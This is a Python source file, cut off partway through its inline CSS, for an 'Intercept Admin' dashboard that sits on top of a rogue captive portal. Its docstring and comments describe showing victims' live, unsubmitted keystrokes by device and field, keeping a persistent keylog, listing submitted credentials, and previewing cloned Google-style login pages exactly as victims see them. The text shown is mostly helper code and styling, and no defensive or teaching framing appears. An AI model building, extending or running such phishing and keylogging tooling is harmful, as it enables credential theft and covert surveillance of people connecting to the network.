#!/usr/bin/env python3
"""Intercept admin dashboard (TailAdmin-style) for the captive portal.

Visit:  http://127.0.0.1:8765/   (no root needed, works offline)

Layout follows the TailAdmin free dashboard template language — dark
sidebar + topbar, metric cards, data tables, dark-mode toggle — but is
reimplemented here as dependency-free inline CSS/JS (no Tailwind CDN, no
npm): this console must render on an isolated box with zero internet.

Pages (single scrolling dashboard):
  LIVE NOW   - who is typing right now, in which field, live unsubmitted
               value. Typing "p23" shows "p23" instantly, no submit needed.
  KEYLOG     - persistent per-device/per-field values, secrets masked until
               REVEAL.
  STREAM     - newest keystroke events as they arrive.
  SUBMITS    - submitted credential lines.

Data comes from portal_server.py on localhost (/live, /tape, /history,
/submissions). Pure stdlib, all assets inline.

Usage:
    python3 spy_view.py [--portal-host 127.0.0.1] [--portal-port 80]
                        [--host 127.0.0.1] [--port 8765]
"""
import argparse
import html as _html
import json
import mimetypes
import os
import re
import urllib.error
import urllib.parse
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer


# -- active-portal preview helpers --------------------------------------
# The phone in Live Now must show EXACTLY what a victim sees: the portal
# folder currently selected in run/last.conf (PORTAL="..."), served here
# same-origin so the iframe always renders even when portal_server :80
# is down. Static assets resolve via /portal-files/.
REPO_ROOT = os.path.dirname(os.path.abspath(__file__))


def _read_kv_conf(path):
    vals = {}
    try:
        with open(path, errors="ignore") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#") or "=" not in line:
                    continue
                k, v = line.split("=", 1)
                v = v.strip().strip('"').strip("'")
                vals[k.strip()] = v
    except OSError:
        pass
    return vals


def get_active_portal_name():
    # run/last.conf wins (what run.sh is actually serving right now)
    last = _read_kv_conf(os.path.join(REPO_ROOT, "run", "last.conf"))
    name = (last.get("PORTAL") or "").strip()
    if name:
        return name
    for cand in (os.path.join(REPO_ROOT, "config.yaml"),):
        try:
            with open(cand, errors="ignore") as f:
                for line in f:
                    m = re.match(r'\s*portal\s*:\s*["\']?([^"\'#\s]+)', line)
                    if m:
                        return m.group(1).strip()
        except OSError:
            pass
    return "my-custom-web-ui"


def get_portal_dir(name=None):
    name = name or get_active_portal_name()
    # traversal-safe: basename only
    safe = os.path.basename(name)
    d = os.path.join(REPO_ROOT, "my-portals", safe)
    if os.path.isdir(d):
        return d, safe
    # fallback: first folder with an html entry
    try:
        for entry in sorted(os.listdir(os.path.join(REPO_ROOT, "my-portals"))):
            dd = os.path.join(REPO_ROOT, "my-portals", entry)
            if os.path.isdir(dd):
                for f in os.listdir(dd):
                    if f.endswith(".html"):
                        return dd, entry
    except OSError:
        pass
    return d, safe


def resolve_portal_entry(portal_dir):
    try:
        with open(os.path.join(portal_dir, "manifest.json"), errors="ignore") as f:
            entry = json.load(f).get("entry", "")
        if entry:
            base = os.path.basename(entry)
            if os.path.isfile(os.path.join(portal_dir, base)):
                return base
    except Exception:
        pass
    for n in ("index.html", "login.html"):
        if os.path.isfile(os.path.join(portal_dir, n)):
            return n
    try:
        htmls = sorted(f for f in os.listdir(portal_dir) if f.endswith(".html"))
        if htmls:
            return htmls[0]
    except OSError:
        pass
    return "index.html"


def load_portal_entry_html():
    portal_dir, name = get_portal_dir()
    entry = resolve_portal_entry(portal_dir)
    full = os.path.join(portal_dir, entry)
    try:
        with open(full, "rb") as f:
            raw = f.read()
    except OSError:
        raw = b"<h1>portal not found</h1>"
    # Inject <base> so relative css/js/img resolve via /portal-files/.
    # Victim sees the same files (portal_server serves the same folder).
    try:
        text = raw.decode("utf-8", errors="ignore")
    except Exception:
        text = "<h1>unreadable portal</h1>"
    base_tag = '<base href="/portal-files/">'
    # hide scrollbars inside the phone preview (scroll still works)
    noscroll = ('<style>html,body{scrollbar-width:none!important;-ms-overflow-style:none!important}'
                '::-webkit-scrollbar{display:none!important;width:0!important;height:0!important}</style>')
    if "<base" in text.lower():
        # cloned Google-style portals ship <base href=""> (empty) which
        # breaks relative assets inside the preview iframe — point it at
        # our same-origin file server instead.
        text = re.sub(r"<base[^>]*>", base_tag, text, count=1, flags=re.I)
    else:
        m = re.search(r"<head[^>]*>", text, flags=re.I)
        if m:
            text = text[:m.end()] + base_tag + text[m.end():]
        else:
            text = base_tag + text
    try:
        m2 = re.search(r"<head[^>]*>", text, flags=re.I)
        if m2:
            text = text[:m2.end()] + noscroll + text[m2.end():]
        else:
            text = noscroll + text
    except Exception:
        pass
    return name, entry, text.encode()

# NOTE: raw string on purpose. The page contains JavaScript with escapes
# like "\n" — in a non-raw triple-quoted string Python would turn those
# into real newlines and silently break the whole dashboard script.
PAGE = r"""<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Intercept Admin — Live Keylog Dashboard</title>
<style>
:root{
  --brand:#3c50e0; --brand-dark:#2f3fc0;
  --bg:#f1f5f9; --panel:#ffffff; --panel2:#f8fafc; --line:#e2e8f0;
  --txt:#1c2434; --dim:#64748b; --faint:#94a3b8;
  --green:#219653; --green-bg:#dcfae6; --red:#d34053; --red-bg:#fde7e9;
  --amber:#b54708; --amber-bg:#fef0c7; --cyan:#0e7490; --cyan-bg:#cffafe;
  --violet:#6941c6; --violet-bg:#ebe9fe;
  --sidebar:#1c2434; --sidebar-txt:#aeb7c2; --sidebar-active:#333a48;
  --shadow:0 1px 3px rgba(16,24,40,.08);
  --radius:12px;
}
body.dark{
  --bg:#0b1220; --panel:#111c33; --panel2:#0d1628; --line:#1e2a44;
  --txt:#e6edf7; --dim:#8ca3bf; --faint:#5b7191;
  --green-bg:rgba(33,150,83,.15); --red-bg:rgba(211,64,83,.15);
  --amber-bg:rgba(255,179,0,.13); --cyan-bg:rgba(69,216,255,.12);
  --violet-bg:rgba(105,65,198,.18);
  --shadow:0 1px 3px rgba(0,0,0,.4);
}
*{box-sizing:border-box}
html,body{margin:0;padding:0}
body{background:var(--bg);color:var(--txt);
  font-family:-apple-system,BlinkMacSystemFont,"Inter","Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
  font-size:14px;-webkit-font-smoothing:antialiased}
/* ---------- sidebar ---------- */
.sidebar{position:fixed;top:0;left:0;bottom:0;width:260px;background:var(--sidebar);
  color:var(--sidebar-txt);display:flex;flex-direction:column;z-index:40;
  transition:transform .25s ease}
.brand{display:flex;align-items:center;gap:10px;padding:22px 24px 18px;color:#fff}
.brand .mark{width:34px;height:34px;border-radius:9px;background:var(--brand);
  display:flex;align-items:center;justify-content:center;font-weight:800;font-size:16px}
.brand .name{font-size:17px;font-weight:700;letter-spacing:.3px}
.brand .name small{display:block;font-size:10px;font-weight:400;letter-spacing:2.5px;color:#8a94a6}
.navlabel{font-size:11px;letter-spacing:1.5px;color:#5d6679;padding:8px 24px 6px}
.nav{display:flex;flex-direction:column;gap:2px;padding:0 12px}
.nav a{display:flex;align-items:center;gap:12px;color:var(--sidebar-txt);text-decoration:none;
  font-size:14px;padding:10px 12px;border-radius:8px}
.nav a svg{width:18px;height:18px;flex:none;opacity:.85}
.nav a:hover{background:#252d3f;color:#fff}
.nav a.active{background:var(--sidebar-active);color:#fff}
.nav a .count{margin-left:auto;font-size:11px;background:#2b3346;color:#c6cfdb;
  border-radius:20px;padding:1px 8px}
.sidefoot{margin-top:auto;padding:18px 24px;font-size:11px;color:#5d6679;line-height:1.6;border-top:1px solid #2b3346}
.sidefoot b{color:#aeb7c2}
/* ---------- main ---------- */
.main{margin-left:260px;min-height:100vh;display:flex;flex-direction:column}
.topbar{position:sticky;top:0;z-index:30;display:flex;align-items:center;gap:12px;
  background:var(--panel);border-bottom:1px solid var(--line);padding:12px 28px}
.topbar h1{font-size:18px;font-weight:700;margin:0}
.topbar .crumb{font-size:12px;color:var(--dim)}
.hamb{display:none;background:none;border:1px solid var(--line);border-radius:8px;
  color:var(--txt);font-size:16px;padding:6px 10px;cursor:pointer}
.search{display:flex;align-items:center;gap:8px;background:var(--panel2);
  border:1px solid var(--line);border-radius:8px;padding:7px 12px;min-width:200px;flex:1;max-width:340px}
.search svg{width:15px;height:15px;color:var(--faint);flex:none}
.search input{background:none;border:none;outline:none;color:var(--txt);font:inherit;font-size:13px;width:100%}
.topactions{margin-left:auto;display:flex;align-items:center;gap:8px}
.pill{display:inline-flex;align-items:center;gap:7px;font-size:12px;font-weight:600;
  border:1px solid var(--line);border-radius:20px;padding:6px 12px;color:var(--dim);background:var(--panel)}
.pill .dot{width:8px;height:8px;border-radius:50%;background:var(--red)}
body.live .pill{color:var(--green);border-color:var(--green)}
body.live .pill .dot{background:var(--green);box-shadow:0 0 6px var(--green)}
.btn{display:inline-flex;align-items:center;gap:6px;background:var(--panel);border:1px solid var(--line);
  color:var(--txt);font:inherit;font-size:12.5px;font-weight:600;padding:7px 13px;border-radius:8px;cursor:pointer}
.btn:hover{border-color:var(--brand);color:var(--brand)}
.btn.primary{background:var(--brand);border-color:var(--brand);color:#fff}
.btn.primary:hover{background:var(--brand-dark)}
.btn.on{border-color:var(--brand);color:var(--brand)}
.btn.sm{padding:4px 11px;font-size:11.5px}
#toast{position:fixed;bottom:22px;left:50%;transform:translateX(-50%) translateY(20px);
  background:var(--sidebar);color:#fff;font-size:12.5px;font-weight:600;
  padding:9px 18px;border-radius:8px;opacity:0;pointer-events:none;transition:all .25s;z-index:99}
#toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
.copyable{cursor:pointer}
.copyable:hover{background:rgba(60,80,224,.08)}
.iconbtn{width:34px;height:34px;display:inline-flex;align-items:center;justify-content:center;
  background:var(--panel);border:1px solid var(--line);border-radius:8px;cursor:pointer;color:var(--txt)}
.iconbtn:hover{border-color:var(--brand);color:var(--brand)}
.iconbtn svg{width:16px;height:16px}
.avatar{width:34px;height:34px;border-radius:50%;background:var(--brand);color:#fff;
  display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:700}
select.devsel{background:var(--panel);border:1px solid var(--line);color:var(--txt);
  font:inherit;font-size:12.5px;padding:7px 10px;border-radius:8px}
/* ---------- content ---------- */
.content{padding:24px 28px 60px;max-width:1200px;width:100%;margin:0 auto}
.metrics{display:grid;grid-template-columns:repeat(4,1fr);gap:18px;margin-bottom:22px}
.metric{background:var(--panel);border:1px solid var(--line);border-radius:var(--radius);
  box-shadow:var(--shadow);padding:18px;display:flex;gap:14px;align-items:center}
.metric .tile{width:46px;height:46px;border-radius:10px;flex:none;display:flex;
  align-items:center;justify-content:center}
.metric .tile svg{width:22px;height:22px}
.tile.blue{background:rgba(60,80,224,.12);color:var(--brand)}
.tile.green{background:var(--green-bg);color:var(--green)}
.tile.amber{background:var(--amber-bg);color:var(--amber)}
.tile.violet{background:var(--violet-bg);color:var(--violet)}
.metric .num{font-size:24px;font-weight:700;line-height:1.1}
.metric .lbl{font-size:12px;color:var(--dim);margin-top:2px}
.card{background:var(--panel);border:1px solid var(--line);border-radius:var(--radius);
  box-shadow:var(--shadow);margin-bottom:22px;overflow:hidden}
.cardhead{display:flex;align-items:center;gap:10px;padding:16px 20px;border-bottom:1px solid var(--line)}
.cardhead h2{font-size:15px;font-weight:700;margin:0}
.cardhead p{font-size:12px;color:var(--dim);margin:2px 0 0}
.cardhead .right{margin-left:auto;display:flex;gap:8px;align-items:center}
.cardbody{padding:18px 20px}
.badge{display:inline-block;font-size:10.5px;font-weight:700;letter-spacing:.4px;
  border-radius:6px;padding:3px 8px;white-space:nowrap}
.b-green{background:var(--green-bg);color:var(--green)}
.b-red{background:var(--red-bg);color:var(--red)}
.b-amber{background:var(--amber-bg);color:var(--amber)}
.b-cyan{background:var(--cyan-bg);color:var(--cyan)}
.b-violet{background:var(--violet-bg);color:var(--violet)}
.b-gray{background:var(--panel2);color:var(--dim);border:1px solid var(--line)}
/* ---------- live phone: iPhone 16 body from phone.html (340x700, do not resize) ---------- */
.live-wrap{display:grid;grid-template-columns:340px 1fr;gap:16px;align-items:start}
.pv-wrap{width:100%;max-width:340px;margin:0 auto}
.pv-livebadge{display:inline-flex;align-items:center;gap:7px;margin:0 0 10px;
  padding:8px 13px;border-radius:20px;background:rgba(16,22,30,.85);
  border:1px solid rgba(255,255,255,.1);font:11px monospace;letter-spacing:1px;color:#cdd6e2}
.pv-livebadge i{width:7px;height:7px;border-radius:50%;background:#475569;flex:none}
.pv-livebadge.on i{background:#25e887;box-shadow:0 0 12px #25e887;animation:pv-pulse 1.6s ease-in-out infinite}
@keyframes pv-pulse{0%,100%{opacity:1}50%{opacity:.45}}
.pv-phone{width:340px;max-width:100%;height:700px;padding:8px;border-radius:46px;flex:none;position:relative;
  background:linear-gradient(90deg,#4a5059 0,#151820 4%,#090b10 10%,#080a0e 50%,#181c23 91%,#6e747d 100%);
  box-shadow:inset 0 0 0 1px #ffffff42,inset 0 0 0 3px #020306,inset 18px 0 22px #ffffff0c,inset -18px 0 20px #00000070,0 0 0 1px #7b828d,0 18px 55px rgba(0,0,0,.55),0 0 50px rgba(36,127,255,.14)}
.pv-phone::before,.pv-phone::after{content:"";position:absolute;height:1px;width:56px;border-radius:1px;
  background:linear-gradient(90deg,transparent,#a7adb755,transparent);
  box-shadow:0 1px 0 #0009,0 -1px 0 #ffffff1a}
.pv-phone::before{left:72px;top:8px}
.pv-phone::after{right:72px;bottom:8px}
.pv-action,.pv-volume,.pv-camctrl{position:absolute;z-index:4;pointer-events:none;border-radius:4px;
  background:linear-gradient(180deg,#68717c,#171b23 48%,#89909a);
  box-shadow:inset 1px 0 1px #ffffff38,inset -1px 0 1px #0008}
.pv-action{left:2px;top:86px;width:3px;height:28px}
.pv-volume{left:2px;top:126px;width:3px;height:82px;
  background:linear-gradient(180deg,#68717c,#171b23 28%,#89909a 32%,#68717c 42%,#171b23 72%,#89909a 76%)}
.pv-camctrl{right:2px;top:448px;width:3px;height:64px;border-radius:5px;
  background:linear-gradient(180deg,#9aa1aa,#2d333c 50%,#b5bbc3)}
.pv-frame{position:absolute;inset:3px;z-index:1;pointer-events:none;border-radius:43px;
  box-shadow:inset 1px 0 0 #ffffff45,inset -1px 0 0 #000,inset 0 1px 0 #ffffff26,inset 0 -1px 0 #000}
.pv-screen{position:relative;z-index:2;width:100%;height:100%;overflow:hidden;border-radius:38px;
  background:radial-gradient(circle at 50% -18%,#ffffff 0,#f7f8fa 32%,#eef1f5 100%) padding-box,linear-gradient(#050608,#050608) border-box;
  background-color:#fff;color:#15171b;display:flex;flex-direction:column;
  border:4px solid #020306;
  box-shadow:inset 0 0 0 1px #15171c,inset 0 0 20px #00000022,0 0 0 1px #000;
  scrollbar-width:none;-ms-overflow-style:none}
.pv-screen::before{content:"";position:absolute;z-index:60;inset:0;pointer-events:none;border-radius:34px;
  background:linear-gradient(114deg,#ffffff34 0,#ffffff12 13%,transparent 34%),radial-gradient(circle at 50% 0,#ffffff42 0,transparent 20%);
  mix-blend-mode:screen}
.pv-screen::-webkit-scrollbar{display:none}
.pv-camera{position:absolute;z-index:70;top:7px;left:50%;transform:translateX(-50%);
  width:98px;height:28px;border-radius:22px;
  background:radial-gradient(circle at 76% 50%,#1e2c43 0 3px,#04060a 5px 8px,transparent 9px),linear-gradient(180deg,#090b10,#000 60%,#050608);
  box-shadow:inset 0 1px 2px #ffffff1c,inset 0 -1px 3px #000,0 1px 3px #0008;
  cursor:pointer;overflow:hidden;color:#fff;
  transition:width .6s cubic-bezier(.32,.72,.24,1),height .6s cubic-bezier(.32,.72,.24,1),border-radius .6s cubic-bezier(.32,.72,.24,1),box-shadow .6s ease}
.pv-camera:hover{box-shadow:inset 0 1px 2px #ffffff1c,inset 0 -1px 3px #000,0 1px 3px #0008,0 0 0 2px rgba(60,80,224,.55)}
.pv-island-compact{width:100%;height:28px;display:flex;align-items:center;justify-content:flex-end;gap:6px;padding:0 12px;
  font-size:10px;color:#8b93a5;white-space:nowrap;transition:opacity .3s ease}
.pv-island-compact .pv-island-live{width:7px;height:7px;border-radius:50%;background:#25e887;box-shadow:0 0 8px #25e887;flex:none}
.pv-island-compact.typing .pv-island-live{animation:pv-pulse 1s ease-in-out infinite}
.pv-island-compact .pv-island-hint{overflow:hidden;text-overflow:ellipsis;max-width:200px}
.pv-island-compact .pv-island-hint b{color:#e6edf7;font-weight:700}
.pv-island-expanded{opacity:0;pointer-events:none;padding:10px 14px 12px;
  transition:opacity .45s ease .12s}
.pv-phone.island-open .pv-camera{width:284px;height:336px;border-radius:28px;
  background:linear-gradient(180deg,#0b0f1c,#000 55%,#0a0d14);
  box-shadow:0 18px 50px rgba(0,0,0,.65),0 0 0 1px #3c50e055,0 0 28px rgba(60,80,224,.35)}
.pv-phone.island-open .pv-island-compact{opacity:0;height:0;padding:0;overflow:hidden}
.pv-phone.island-open .pv-island-expanded{opacity:1;pointer-events:auto}
.pv-camera.typing{box-shadow:inset 0 1px 2px #ffffff1c,inset 0 -1px 3px #000,0 1px 3px #0008,0 0 14px rgba(37,232,135,.55)}
.pv-camera:active{transform:translateX(-50%) scale(.97)}
.pv-phone.island-open .pv-view{filter:brightness(.72) saturate(1.1);transition:filter .4s ease}
.pv-view{transition:filter .4s ease}
.pv-island-head{display:flex;align-items:center;justify-content:space-between;
  font-size:11px;font-weight:800;letter-spacing:1.2px;color:#e6edf7;margin:2px 0 8px}
.pv-island-head .ttl{display:flex;align-items:center;gap:7px}
.pv-island-head .pulse{width:8px;height:8px;border-radius:50%;background:#25e887;box-shadow:0 0 10px #25e887;animation:pv-pulse 1.4s ease-in-out infinite}
.pv-island-head button{background:#1c2434;border:1px solid #2b3a55;color:#cdd6e2;
  width:22px;height:22px;border-radius:50%;cursor:pointer;font-size:13px;line-height:1}
.pv-island-head button:hover{border-color:#3c50e0;color:#fff;transform:scale(1.1)}
.pv-tabs{display:flex;gap:4px;background:#101828;border:1px solid #26334e;border-radius:10px;padding:3px;margin-bottom:8px}
.pv-tabs button{flex:1;border:0;background:transparent;color:#8ca3bf;font:inherit;font-size:10px;font-weight:800;letter-spacing:.6px;
  border-radius:7px;padding:6px 0;cursor:pointer;transition:all .25s}
.pv-tabs button.on{background:linear-gradient(180deg,#3c50e0,#2f3fc0);color:#fff;box-shadow:0 2px 10px rgba(60,80,224,.5)}
.pv-tabs button:not(.on):hover{color:#e6edf7;background:#18223a}
.pv-tabpane{display:none}
.pv-tabpane.on{display:block;animation:pv-tabin .35s cubic-bezier(.34,1.56,.64,1)}
@keyframes pv-tabin{from{opacity:0;transform:translateY(8px) scale(.98)}to{opacity:1;transform:none}}
.pv-island-list{display:flex;flex-direction:column;gap:6px;max-height:158px;overflow-y:auto;
  scrollbar-width:none;-ms-overflow-style:none}
.pv-island-list::-webkit-scrollbar{display:none}
.pv-island-dev{display:flex;align-items:center;gap:8px;width:100%;text-align:left;
  background:#141d31;border:1px solid #26334e;color:#e6edf7;border-radius:12px;
  padding:8px 10px;cursor:pointer;font-size:11px;
  transition:border-color .2s,background .2s,transform .15s}
.pv-island-dev:hover{border-color:#3c50e0;background:#18223a;transform:translateX(2px)}
.pv-island-dev:active{transform:scale(.98)}
.pv-island-dev.pinned{border-color:#25e887;background:#14291f;box-shadow:0 0 12px rgba(37,232,135,.25)}
.pv-island-dev .ip{font-weight:700;white-space:nowrap}
.pv-island-dev .mac{color:#8ca3bf;font-size:10px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.pv-island-dev .tag{margin-left:auto;font-size:9px;font-weight:700;letter-spacing:.5px;
  border-radius:6px;padding:2px 6px;white-space:nowrap}
.pv-island-dev .tag.typing{background:#25e887;color:#04120a;animation:pv-pulse 1s infinite}
.pv-island-dev .tag.recent{background:#f59e0b;color:#1a1000}
.pv-island-dev .tag.idle{background:#26334e;color:#8ca3bf}
.pv-island-foot{margin-top:8px;font-size:10px;color:#8ca3bf;text-align:center}
.pv-island-empty{font-size:11px;color:#8ca3bf;text-align:center;padding:18px 0}
.pv-live-big{background:#0d1526;border:1px solid #26334e;border-radius:12px;padding:9px 10px;margin-bottom:8px;overflow:hidden}
.pv-live-field{font-size:9px;font-weight:800;letter-spacing:1.2px;color:#3c50e0;margin-bottom:4px}
.pv-live-value{font-family:Consolas,Menlo,monospace;font-size:15px;font-weight:700;color:#e6edf7;
  white-space:nowrap;overflow:hidden;text-overflow:ellipsis;min-height:20px}
.pv-live-value .caret{display:inline-block;width:8px;height:15px;background:#25e887;vertical-align:-2px;animation:pv-pulse 1s infinite}
#pv-wave{width:100%;height:46px;display:block;background:#0d1526;border:1px solid #26334e;border-radius:12px;margin-bottom:8px}
.pv-live-tape{font-family:Consolas,Menlo,monospace;font-size:10px;color:#8ca3bf;background:#0d1526;border:1px solid #26334e;
  border-radius:10px;padding:7px 9px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;min-height:28px}
.pv-live-tape b{color:#25e887}
.pv-actions-grid{display:grid;grid-template-columns:1fr 1fr;gap:6px}
.pv-act{display:flex;align-items:center;gap:8px;background:#141d31;border:1px solid #26334e;color:#e6edf7;
  border-radius:11px;padding:9px 10px;font-size:11px;font-weight:700;cursor:pointer;transition:all .18s;text-align:left;width:100%}
.pv-act span.ic{font-size:14px}
.pv-act:hover{border-color:#3c50e0;background:#1a2540;transform:translateY(-1px);box-shadow:0 4px 14px rgba(60,80,224,.3)}
.pv-act:active{transform:scale(.96)}
.pv-act.on{border-color:#25e887;background:#14291f}
.pv-act.flash{animation:pv-actflash .5s ease}
@keyframes pv-actflash{0%{background:#25e887;color:#04120a}100%{}}
.pv-camera.shake{animation:pv-shake .4s ease}
@keyframes pv-shake{0%,100%{transform:translateX(-50%)}20%{transform:translateX(calc(-50% - 5px))}40%{transform:translateX(calc(-50% + 5px))}60%{transform:translateX(calc(-50% - 3px))}80%{transform:translateX(calc(-50% + 3px))}}
.pv-statusbar{height:54px;padding:25px 17px 0;display:flex;justify-content:space-between;align-items:flex-start;
  color:#111318;font-size:12px;font-weight:800;letter-spacing:-.1px;flex:none;background:transparent;z-index:2}
.pv-status-icons{display:flex;align-items:center;gap:6px;color:#20242a}
.pv-status-icons .wifi{width:18px;height:14px;display:block}
.pv-status-icons .battery{width:26px;height:13px;display:block}
.pv-portalbar{flex:none;display:flex;align-items:center;gap:8px;padding:8px 12px;
  background:#111c33;color:#e6edf7;font-size:11px;border-top:1px solid #1e2a44;border-bottom:1px solid #1e2a44}
.pv-portalbar .dot{width:7px;height:7px;border-radius:50%;background:#25e887;box-shadow:0 0 8px #25e887;flex:none}
.pv-portalbar b{font-size:11px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.pv-portalbar span.sub{color:#8ca3bf;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.pv-portalbar .sp{flex:1}
.pv-portalbar button{background:#1c2434;border:1px solid #2b3a55;color:#cdd6e2;font-size:11px;
  border-radius:6px;padding:4px 8px;cursor:pointer;white-space:nowrap}
.pv-portalbar button:hover{border-color:#3c50e0;color:#fff}
.pv-devicebar{flex:none;padding:6px 12px;font-size:10.5px;color:#64748b;background:#f8fafc;
  border-bottom:1px solid #e2e8f0;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.pv-view{flex:1;position:relative;background:#fff;min-height:0;overflow:hidden;
  scrollbar-width:none;-ms-overflow-style:none}
.pv-view::-webkit-scrollbar,.pv-view iframe::-webkit-scrollbar{display:none}
.pv-view iframe{position:absolute;inset:0;width:100%;height:100%;border:0;background:#fff;
  overflow:auto;scrollbar-width:none;-ms-overflow-style:none}
.pv-view .pv-fallback{position:absolute;inset:0;display:none;overflow:auto;padding:16px;background:#fff;color:#111}
/* ----- live keyboard: mirrors REAL keylog, finger taps what victim types ----- */
.pv-kb{flex:none;position:relative;padding:7px 5px 13px;background:linear-gradient(180deg,#e6e8ec,#cfd4db 100%);border-top:1px solid #bfc4cc;box-shadow:0 -1px 12px #00000012;color:#22262b}
.pv-kb::after{content:"";position:absolute;left:50%;bottom:5px;width:112px;height:4px;transform:translateX(-50%);border-radius:4px;background:#1b1d21;opacity:.72}
.pv-predictions{display:grid;grid-template-columns:1fr 1fr 1fr;height:30px;align-items:center;
  text-align:center;color:#333940;font-size:12px;border-bottom:1px solid #c5c9cf;margin-bottom:6px}
.pv-predictions span{border-right:1px solid #c0c4ca;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;padding:0 6px}
.pv-predictions span:last-child{border:0}
.pv-row{display:flex;gap:4px;margin:4px 0}
.pv-numrow{margin-top:0}
.pv-key{flex:1;height:34px;display:grid;place-items:center;border-radius:7px;background:linear-gradient(180deg,#ffffff,#f8f9fb);
  color:#22262b;font-size:13px;user-select:none;
  box-shadow:0 1px 0 #ffffff inset,0 1px 1px #8f959e,0 2px 3px #a0a6ae;
  transition:transform .08s,background .08s,box-shadow .08s}
.pv-key.pv-num{height:30px;font-size:12px;background:linear-gradient(180deg,#ffffff,#f1f4f8)}
.pv-key.special{background:linear-gradient(180deg,#eef1f5,#c8ced7)}
.pv-key.space{flex:5;font-size:11px;color:#777d86}
.pv-key.wide{flex:1.5}
.pv-key.hit{transform:translateY(-6px) scale(1.13);background:#dceaff;color:#1769d3;
  box-shadow:0 7px 16px rgba(66,133,244,.35),0 0 0 1px rgba(66,133,244,.45)}
.pv-emoji-panel{display:none;height:196px;overflow-y:auto;padding:6px 4px;background:#d9dde3;
  scrollbar-width:none;-ms-overflow-style:none}
.pv-emoji-panel::-webkit-scrollbar{display:none}
.pv-emoji-panel.show{display:block}
.pv-emoji-category{padding:3px 7px 5px;color:#6b7077;font-size:10px;font-weight:600}
.pv-emoji-grid{display:grid;grid-template-columns:repeat(7,1fr);gap:3px}
.pv-emoji{height:32px;display:grid;place-items:center;border-radius:7px;font-size:19px;cursor:default;user-select:none;transition:transform .08s,background .08s}
.pv-emoji.selected{transform:scale(1.35);background:#fff;box-shadow:0 0 0 1px #4285f4}
.pv-emoji-header{height:30px;display:flex;align-items:center;justify-content:space-between;
  padding:0 9px;color:#4b5057;font-size:11px;border-bottom:1px solid #c5c9cf;margin-bottom:4px}
.pv-emoji-header span:first-child{font-weight:600}
.pv-bottom{display:flex;justify-content:space-around;margin-top:6px;color:#666c73;font-size:11px}
#pv-finger{position:absolute;z-index:50;width:40px;height:40px;display:grid;place-items:center;
  font-size:28px;pointer-events:none;opacity:0;transform:translate(-50%,-50%) scale(.9);
  filter:drop-shadow(0 5px 8px rgba(0,0,0,.4));
  transition:left .45s cubic-bezier(.2,.8,.2,1),top .45s cubic-bezier(.2,.8,.2,1),transform .15s ease,opacity .2s ease}
#pv-finger.tap{transform:translate(-50%,-50%) scale(.65)}
#pv-finger-ring{position:absolute;z-index:49;width:38px;height:38px;border-radius:50%;
  border:2px solid #4285f4;pointer-events:none;opacity:0;transform:translate(-50%,-50%) scale(.5)}
#pv-finger-ring.show{animation:pv-ring .45s ease-out}
@keyframes pv-ring{0%{opacity:.9;transform:translate(-50%,-50%) scale(.5)}100%{opacity:0;transform:translate(-50%,-50%) scale(1.5)}}
@media(max-width:900px){.live-wrap{grid-template-columns:1fr}.pv-wrap{max-width:340px}}
.tdots{display:inline-flex;gap:3px;margin-right:6px;vertical-align:1px}
.tdots span{width:5px;height:5px;border-radius:50%;background:currentColor;animation:tb .9s infinite}
.tdots span:nth-child(2){animation-delay:.15s}.tdots span:nth-child(3){animation-delay:.3s}
@keyframes tb{0%,100%{opacity:.25;transform:translateY(0)}50%{opacity:1;transform:translateY(-2px)}}
.grid2{display:grid;grid-template-columns:repeat(auto-fill,minmax(330px,1fr));gap:16px}
.dev{border:1px solid var(--line);border-radius:10px;overflow:hidden}
.dev.typing{border-color:var(--green);box-shadow:0 0 0 1px var(--green)}
.devhead{display:flex;align-items:center;gap:8px;padding:11px 14px;background:var(--panel2);font-size:13px}
.devhead .ip{font-weight:700}
.devhead .mac{color:var(--dim);font-size:11px}
.devhead .tag{margin-left:auto}
.devwhere{padding:8px 14px;font-size:11.5px;color:var(--dim);border-top:1px solid var(--line)}
.devwhere b{color:var(--txt);font-weight:600}
.lve{padding:12px 14px;border-top:1px solid var(--line)}
.lve .k{font-size:10.5px;letter-spacing:1.2px;color:var(--dim);margin-bottom:5px}
.lve .k b{color:var(--brand)}
.lve .v{font-size:22px;font-weight:600;word-break:break-all;white-space:pre-wrap;line-height:1.45;font-family:Consolas,Menlo,monospace}
.lve .v .caret{display:inline-block;width:10px;height:20px;background:var(--green);vertical-align:-3px;animation:caretBlink 1.1s steps(1) infinite}
.lve .v .fresh-char{display:inline-block;animation:charIn .28s ease-out}
@keyframes charIn{from{opacity:0;transform:translateY(7px) scale(.92)}to{opacity:1;transform:none}}
@keyframes caretBlink{0%,55%{opacity:1}56%,100%{opacity:0}}
.lve .m{font-size:11px;color:var(--dim);margin-top:5px}
.frow{display:flex;gap:10px;align-items:baseline;padding:7px 14px;border-top:1px solid var(--line);font-size:12.5px}
.frow.hot{background:rgba(60,80,224,.05)}
.fname{color:var(--dim);min-width:120px;max-width:170px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.fval{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-family:Consolas,Menlo,monospace}
.tape{padding:9px 14px;font-size:12px;color:var(--dim);border-top:1px solid var(--line);
  font-family:Consolas,Menlo,monospace;white-space:pre-wrap;word-break:break-all}
.tape .new{color:var(--green);font-weight:700}
table.tbl{width:100%;border-collapse:collapse;font-size:13px}
.tbl th{text-align:left;font-size:10.5px;letter-spacing:1px;color:var(--dim);font-weight:700;
  padding:10px 14px;border-bottom:1px solid var(--line);background:var(--panel2);white-space:nowrap}
.tbl td{padding:10px 14px;border-bottom:1px solid var(--line);vertical-align:top;word-break:break-all}
.tbl tr:last-child td{border-bottom:none}
.tbl tbody tr:hover{background:var(--panel2)}
.tbl td.ip{font-weight:700;white-space:nowrap}
.tbl td.fd{white-space:nowrap}
.tbl td.when{color:var(--dim);white-space:nowrap;font-size:12px}
